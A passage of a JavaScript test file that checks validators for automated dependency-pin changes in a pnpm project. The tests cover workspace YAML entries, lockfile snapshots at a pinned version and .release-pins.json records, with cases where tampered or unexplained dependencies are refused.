    assert.match(check(head.replace(`${key}\n`, `${key}\nminimumReleaseAgeExclude:\n`)), /is not followed by a top-level key|changes more than the pinned packages' items/, key);
    assert.match(check(head.replace(`${key}\n`, `${key}\nminimumReleaseAgeExclude:\n${item}\n`)), /is not followed by a top-level key|changes more than the pinned packages' items/, `${key} with an item`);
    assert.match(check(head.replace(`${key}\n`, `${key}\nminimumReleaseAgeExclude:\n${item}\n\n`)), /is not followed by a top-level key|changes more than the pinned packages' items/, `${key} with an item and a blank line`);
  }
  // A key line on its own, anywhere: it stays in the comparison.
  assert.match(check(`${head}minimumReleaseAgeExclude:\n`), /changes more than the pinned packages' items/);
  assert.match(check(head.replace('overrides:', 'minimumReleaseAgeExclude:\noverrides:')), /changes more than the pinned packages' items/);
  // Where pnpm puts it: between top-level keys or at the end, with the pinned package's item.
  assert.equal(check(`${head}minimumReleaseAgeExclude:\n${item}\n`), null);
  assert.equal(check(`${head}\nminimumReleaseAgeExclude:\n${item}\n`), null);
  assert.equal(check(head.replace('overrides:', `minimumReleaseAgeExclude:\n${item}\noverrides:`)), null);
  assert.match(check(head.replace('patchedDependencies:', `minimumReleaseAgeExclude:\n${item}\n\npatchedDependencies:`)), /changes more than the pinned packages' items/, 'a blank line added with it');
  // Twice, and after something that is not a key.
  assert.match(check(head.replace('overrides:', `minimumReleaseAgeExclude:\n${item}\noverrides:`).concat(`minimumReleaseAgeExclude:\n${item}\n`)), /has minimumReleaseAgeExclude twice/);
  assert.match(check(`${head}minimumReleaseAgeExclude:\n${item}\n]\n`), /is not followed by a top-level key/);
  assert.match(check(`${head}minimumReleaseAgeExclude:\n${item}\n# a comment\n`), /is not followed by a top-level key/);
  // The quoting pnpm writes: a plain item starting with @ is not YAML, and pnpm does not write double quotes.
  assert.match(check(`${head}minimumReleaseAgeExclude:\n  - @revt-eng/core@0.1.562-rl.1.5\n`), /quoted as pnpm writes it/);
  assert.match(check(`${head}minimumReleaseAgeExclude:\n  - "@revt-eng/core@0.1.562-rl.1.5"\n`), /changes more than the pinned packages' items/);
  const plain = [{ name: 'create-revturbine', version: '1.2.0' }];
  assert.equal(workspaceRefusal('pnpm-workspace.yaml', `${head}minimumReleaseAgeExclude:\n  - create-revturbine@1.1.0\n`, `${head}minimumReleaseAgeExclude:\n  - create-revturbine@1.1.0 || 1.2.0\n`, plain), null);
  assert.match(workspaceRefusal('pnpm-workspace.yaml', head, `${head}minimumReleaseAgeExclude:\n  - 'create-revturbine@1.2.0'\n`, plain), /quoted as pnpm writes it/);
});

test('an entry at the pin that the branch held and nothing depended on is checked as the pin\'s', () => {
  const sdkSnapshot = "  '@revt-eng/sdk@1.4.0(react@19.2.7)':\n    dependencies:\n      react: 19.2.7";
  const zods = (text) => text.replace('  zod@4.0.0:\n    resolution: {integrity: sha512-zod}', '  zod@3.0.0:\n    resolution: {integrity: sha512-zod3}\n\n  zod@4.0.0:\n    resolution: {integrity: sha512-zod}').replace('  zod@4.0.0: {}', '  zod@3.0.0: {}\n\n  zod@4.0.0: {}');
  // The head carries the pinned version's packages and snapshots entries already, unused; the pin moves the importer.
  const planted = (edges, fields = '') => zods(peerBefore)
    .replace("  '@revt-eng/sdk@1.3.0':", `  '@revt-eng/sdk@1.4.0':\n${sdkResolution}${fields}\n    peerDependencies:\n      react: '>=19'\n\n  '@revt-eng/sdk@1.3.0':`)
    .replace("  '@revt-eng/sdk@1.3.0(react@19.2.7)':", `${sdkSnapshot}${edges}\n\n  '@revt-eng/sdk@1.3.0(react@19.2.7)':`);
  const moved = (edges, fields = '') => zods(peerAfter()).replace(sdkSnapshot, `${sdkSnapshot}${edges}`).replace(sdkResolution, `${sdkResolution}${fields}`);
  const check = (edges, fields) => peerRefusal(planted(edges, fields), moved(edges, fields));
  assert.equal(check(''), null, 'as the registry publishes it');
  assert.equal(check('\n      zod: 4.0.0'), null);
  // The reviewer's input: an undeclared dependency and a version out of the registry's range.
  assert.match(check('\n      drizzle-orm: 0.45.2\n      zod: 3.0.0'), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\), which nothing on the branch depended on, depends on drizzle-orm, which the registry does not list/);
  assert.match(check('\n      zod: 3.0.0'), /which nothing on the branch depended on, depends on zod at 3\.0\.0, which is neither the branch's only snapshot of it nor in the registry's range/);
  assert.match(check('\n    optional: true'), /snapshots @revt-eng\/sdk@1\.4\.0\(react@19\.2\.7\) is optional, which the lockfile's dependencies do not explain/);
  assert.match(check('', '\n    requiresBuild: true'), /packages @revt-eng\/sdk@1\.4\.0, which nothing on the branch depended on, has requiresBuild, which pnpm does not write on a package/);
  // An entry at the pin that the branch was already using is the branch's: the same pin dispatched again changes nothing.
  assert.equal(peerRefusal(peerAfter(), peerAfter()), null);
});

test('.release-pins.json: a record is the range a prerelease pin replaced, and goes with the final pin', () => {
  const prerelease = [{ name: '@revt-eng/sdk', version: '1.4.0-rl.7.3' }], final = [{ name: '@revt-eng/sdk', version: '1.4.0' }];
  const atHead = (file, name) => (file === 'package.json' && name === '@revt-eng/sdk' ? '^1.3.0' : file === 'exact/package.json' && name === '@revt-eng/sdk' ? '1.3.0' : undefined);
  const record = (file, range, name = '@revt-eng/sdk') => JSON.stringify({ [file]: { [name]: range } });
  // Added: by a prerelease pin, as the range the manifest holds on the branch.
  assert.equal(pinRecordsRefusal({}, record('package.json', '^1.3.0'), prerelease, atHead), null);
  const planted = /is not a range that manifest holds for it on the branch/;
  assert.match(pinRecordsRefusal({}, record('package.json', '>=0.0.1'), prerelease, atHead), planted, 'a range the manifest never had');
  assert.match(pinRecordsRefusal({}, record('nope/package.json', '*'), prerelease, atHead), planted, 'a manifest that does not exist');
  assert.match(pinRecordsRefusal({}, record('exact/package.json', '1.3.0'), prerelease, atHead), planted, 'an exact version is not recorded');
  assert.match(pinRecordsRefusal({}, record('package.json', '^1.3.0'), final, atHead), planted, 'a final pin records nothing');
  assert.match(pinRecordsRefusal({}, record('package.json', '^1.3.0'), prerelease), planted, 'no manifest to compare with');
  assert.match(pinRecordsRefusal({}, record('package.json', '*', 'react'), prerelease, atHead), /changes the record of react, which is not being pinned/);
  // Existing records: unchanged, or removed by the final pin of that package.
  const held = { 'package.json': { '@revt-eng/sdk': '^1.3.0' }, 'web-sdk/package.json': { '@revt-eng/core': '^1.0.0' } };
  assert.equal(pinRecordsRefusal(held, JSON.stringify(held), prerelease, atHead), null);
  assert.equal(pinRecordsRefusal(held, JSON.stringify({ 'web-sdk/package.json': held['web-sdk/package.json'] }), final, atHead), null);
  assert.match(pinRecordsRefusal(held, JSON.stringify({ 'web-sdk/package.json': held['web-sdk/package.json'] }), prerelease, atHead), /drops the range recorded for @revt-eng\/sdk in package\.json, which only its final pin does/);
  assert.match(pinRecordsRefusal(held, JSON.stringify({ ...held, 'package.json': { '@revt-eng/sdk': '>=0.0.1' } }), prerelease, atHead), /changes the range recorded for @revt-eng\/sdk in package\.json/);
  assert.match(pinRecordsRefusal(held, JSON.stringify({ ...held, 'package.json': { '@revt-eng/sdk': '>=0.0.1' } }), final, atHead), /changes the range recorded/);
  assert.match(pinRecordsRefusal(held, JSON.stringify({ 'package.json': held['package.json'] }), final, atHead), /changes the record of @revt-eng\/core, which is not being pinned/);
  assert.match(pinRecordsRefusal(held, null, final, atHead), /changes the record of @revt-eng\/core, which is not being pinned/);
});
